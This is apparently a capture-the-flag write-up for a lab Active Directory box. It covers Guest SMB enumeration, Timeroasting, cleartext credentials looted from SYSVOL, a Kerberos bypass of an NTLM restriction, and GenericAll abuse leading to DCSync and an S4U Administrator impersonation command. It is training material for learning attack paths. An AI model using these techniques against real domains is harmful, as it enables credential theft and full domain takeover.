---
title: HackSmarter - Past
date: 2026-06-29
image: cover.png
tags: [HackSmarter, Medium, Windows, Active Directory]
excerpt: A medium Active Directory box that pivots from a Guest-readable share through a Timeroasting attack to take over a machine account, loots cleartext credentials from SYSVOL, bypasses an NTLM account restriction with Kerberos, and abuses a GenericAll edge over the domain controller to DCSync the domain.
---

# Past

### NMAP Scanning

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-29 14:57:42Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  syn-ack ttl 126 Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: PAST)
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: PAST
|   NetBIOS_Domain_Name: PAST
|   NetBIOS_Computer_Name: EC2AMAZ-A5O4OL8
|   DNS_Domain_Name: past.local
|   DNS_Computer_Name: EC2AMAZ-A5O4OL8.past.local
|   DNS_Tree_Name: past.local
|   Product_Version: 10.0.14393
|_  System_Time: 2026-06-29T14:58:38+00:00
|_ssl-date: 2026-06-29T14:59:17+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-A5O4OL8.past.local
| Issuer: commonName=EC2AMAZ-A5O4OL8.past.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-28T14:52:50
| Not valid after:  2026-12-28T14:52:50
| MD5:   8f5b:848e:a9de:c478:0c94:944d:cdfb:b0b1
| SHA-1: 1ee6:d1b1:464a:603f:73bd:d392:f569:0c4e:46f9:ba02
| -----BEGIN CERTIFICATE-----
| MIIC+DCCAeCgAwIBAgIQQmYrhBpUfLhObWirc7wUJzANBgkqhkiG9w0BAQsFADAl
| MSMwIQYDVQQDExpFQzJBTUFaLUE1TzRPTDgucGFzdC5sb2NhbDAeFw0yNjA2Mjgx
| NDUyNTBaFw0yNjEyMjgxNDUyNTBaMCUxIzAhBgNVBAMTGkVDMkFNQVotQTVPNE9M
| OC5wYXN0LmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5EQf
| mcq8SWtRYYJHa9yAaRtJBCA1ncOND3//VdXFgXkXSSiDMIwnswCuWjAMm3lKtSnz
| KhZaeh21W3ilDXKk7+b3pOneHkAXpUCGY2TwdF939ZEo+tveEb4+GfZnE1PNUYmx
| SYgF/zPQGnZz327LAiHVJtRYHCcsmqLXRYU84K5emZfb4fVZiiJTvI4jFfLdl7Qw
| XHkjYk72PKW83g/faL2PO0BNgebO6HHZAw0b7HkSe1WoEt9r0v/Elrv8O9lIbMNc
| vhK1mc3l8t4Ft4QMLmFsX6h4MVmgi0qQA0WrfR8HV8aOPJ4/tarLV7hL7yGLKey+
| 0IBOTr+JO9Y9nWsu0wIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNV
| HQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBALXYpxXheeed3cJMkXEX9q3c7w3o
| r+aiS9LISHWxekIV7aIRmcmUCWYeL6+sAjkObwXytwM5W/3YrQMcSTaxLUdTR2xv
| D5LwYwtmh6fIS14DtbfyzUSv1RNkRQ0j7RKlWOKfS/jKwRiFe78QHwe2fecZFRCP
| lNKZ82SpEMJOnqEhYAjIhkS85bwSKu3VkX23oxg/9xbLlDjGUfpVRnu3Wi5rWEh/
| nz7TkpfkrI6P7TYHKu2P/fH5SRkPhVSzgaftGbDvPt5Zbl3hK4LSgyKTXKsFttoa
| rvsFBTlXzgenvla3r3tmHaHwYdnIpDaWs+eAM8KjEYRi1qx7JIwnpWZkmSk=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: EC2AMAZ-A5O4OL8; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 22333/tcp): CLEAN (Timeout)
|   Check 2 (port 42197/tcp): CLEAN (Timeout)
|   Check 3 (port 48368/udp): CLEAN (Timeout)
|   Check 4 (port 53105/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-06-29T14:58:39
|_  start_date: 2026-06-29T14:52:52
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: EC2AMAZ-A5O4OL8
|   NetBIOS computer name: EC2AMAZ-A5O4OL8\x00
|   Domain name: past.local
|   Forest name: past.local
|   FQDN: EC2AMAZ-A5O4OL8.past.local
|_  System time: 2026-06-29T14:58:41+00:00
```

### RPC Enumeration

Enumerating RPC with NULL authentication returns an `NT_STATUS_ACCESS_DENIED` error, ruling out anonymous queries against the interface:

{% image %}

### SMB Enumeration - Guest & NULL Authentication

The Guest account, however, is enabled and allows SMB enumeration to succeed:

{% image2 %}

Mapping the domain name and the machine hostname into the `/etc/hosts` file:

```bash
10.1.99.59	EC2AMAZ-A5O4OL8.past.local past.local
```

### LDAP Enumeration

Getting the naming contexts:

```bash
➜  past ldapsearch -x -H ldap://10.1.99.59 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=past,DC=local
namingContexts: CN=Configuration,DC=past,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=past,DC=local
namingContexts: DC=DomainDnsZones,DC=past,DC=local
namingContexts: DC=ForestDnsZones,DC=past,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Any query beyond the base naming contexts returns an error demanding a successful bind, which confirms anonymous LDAP access is restricted and valid credentials are required to enumerate further:

{% image3 %}

### SMB - Share Enumeration

Returning to SMB, the Guest account holds read access over the `Share` share. Accessing it with `impacket-smbclient`:

```bash
impacket-smbclient past.local/Guest:''@past.local
```

{% image4 %}

The share contains a text file named "AD_Machines.txt". Downloading it to review the contents:

{% image5 %}

The file lists several Active Directory machine names, which may correspond to hosts on the internal network or to machine accounts created in the domain. The first thing worth checking is whether any of these are Pre2k computers. When a computer account is created with the pre-Windows 2000 compatibility flag, its initial password is set to the lowercase hostname, which makes it guessable. The following custom Python script normalizes the names into matching username and password lists:

```python
#!/usr/bin/env python3
"""
normalize_users.py
Usage:
    python normalize_users.py <input_file>
Reads a file (passed as argv[1]) containing one username per line,
normalizes each username by:
  - stripping whitespace
  - removing trailing '$'
Writes two lines per user to "passwords.txt":
  - one in lowercase
  - one in uppercase
Also writes two identical lines per user to "usernames.txt"
(the normalized name with a trailing '$'), so the two files line up
entry-for-entry.
"""
import sys
from pathlib import Path

def normalize_username(name: str) -> str:
    name = name.strip()
    if not name:
        return ""
    return name.rstrip('$')

def main():
    if len(sys.argv) != 2:
        print("Usage: python normalize_users.py <input_file>")
        sys.exit(1)

    input_path = Path(sys.argv[1])
    if not input_path.exists() or not input_path.is_file():
        print(f"Error: input file '{input_path}' not found or not a file.")
        sys.exit(2)

    pw_path = Path("passwords.txt")
    user_path = Path("usernames.txt")
    count = 0

    with input_path.open("r", encoding="utf-8", errors="replace") as infile, \
         pw_path.open("w", encoding="utf-8") as pwfile, \
         user_path.open("w", encoding="utf-8") as userfile:
        for line in infile:
            name = normalize_username(line)
            if name:
                pwfile.write(name.lower() + "\n")
                pwfile.write(name.upper() + "\n")

                userfile.write(name + "$\n")
                userfile.write(name + "$\n")

                count += 1

    print(f"Wrote {count * 2} entries to {pw_path.resolve()}")
    print(f"Wrote {count * 2} entries to {user_path.resolve()}")

if __name__ == "__main__":
    main()
```

Running it produces the following output:

{% image6 %}

Testing the generated credentials yields no valid Pre2k accounts:

{% image7 %}

AS-REP Roasting against the machine accounts also fails, since none of them have pre-authentication disabled:

```bash
➜  past impacket-GetNPUsers -no-pass -usersfile machines.txt past.local/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User EC2AMAZ-A5O4OL8$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User APPDEV01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User WEBDEV01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DEV01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The `Guest` access to SMB still allows a RID brute-force attack, which enumerates the domain users and groups by walking the Security Identifiers rather than querying restricted LDAP:

{% image8 %}

Spraying this user list produces no valid hits either:

{% image9 %}

### Timeroasting - Attacking NTP

The remaining avenue is Timeroasting. The attack requests NTP authenticators from the domain controller, which are derived from a computer account's password hash and can be obtained without any credentials, then cracks them offline using [https://github.com/bvcyber/Timeroast/blob/main/extra-scripts/timecrack.py](https://github.com/bvcyber/Timeroast/blob/main/extra-scripts/timecrack.py) or `hashcat`.

{% image10 %}

Cracking the hashes with the [`timecrack.py`](http://timecrack.py) script requires one fix first. Running it as-is throws `UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte`, because `rockyou.txt` contains raw bytes from old password dumps that are not valid UTF-8. Changing the dictionary line to read the file as latin-1 resolves it:

```python
argparser.add_argument('dictionary', type=FileType('r', encoding='latin-1'), help='Line-delimited password dictionary')
```

With that change in place, the crack lands a hit on RID 1115:

{% image11 %}

The earlier `--rid-brute` output identifies RID 1115 as the `APPDEV01$` machine account:

{% image12 %}

Confirming the recovered machine account credentials with a quick `netexec` SMB query:

{% image13 %}

Reconnecting with this account and browsing the `SYSVOL` share reveals an interesting `.cmd` file named `tyler_init.cmd`:

{% image14 %}

The file holds cleartext credentials for a temporary dev helper account:

{% image15 %}

```python
set TYLER_USER=tyler
set TYLER_PASS=5rtfgvb%RTFGVB
```

Authenticating with these credentials returns a `STATUS_ACCOUNT_RESTRICTION` error, which indicates the account is blocked from authenticating over NTLM:

{% image16 %}

This restriction applies to NTLM only and can be bypassed by authenticating over Kerberos instead, requesting a ccache ticket for the account:

{% image17 %}

Using the resulting ccache file with `netexec`:

{% image18 %}

### Active Directory - Domain Reconnaissance

Collecting the BloodHound data through netexec with `--bloodhound`:

{% image19 %}

The BloodHound data shows that the current user `tyler` holds `GenericAll` over the domain controller object:

{% image20 %}

The simplest route is to reset the DC's machine account password and then impersonate a Domain Admin, since machine accounts behave the same as service accounts under the hood.

{% image21 %}

With control over the DC machine account, a DCSync attack becomes possible, because the domain controller's machine account holds directory replication rights by default:

{% image22 %}

An alternative is an S4U attack with impacket to impersonate the Administrator account, again leveraging the fact that machine accounts function like service accounts:

```python
sudo impacket-getST -self -impersonate 'Administrator' -altservice 'HOST/ec2amaz-a5040l8.past.local' 'past.local'/'EC2AMAZ-A5O4OL8$':'Password123!' -dc-ip 10.1.99.59
```

{% image23 %}

The resulting ticket can be used with `psexec` or any similar tool. For this walkthrough the DCSync attack is used to dump the secrets and collect the remaining flags:

{% image24 %}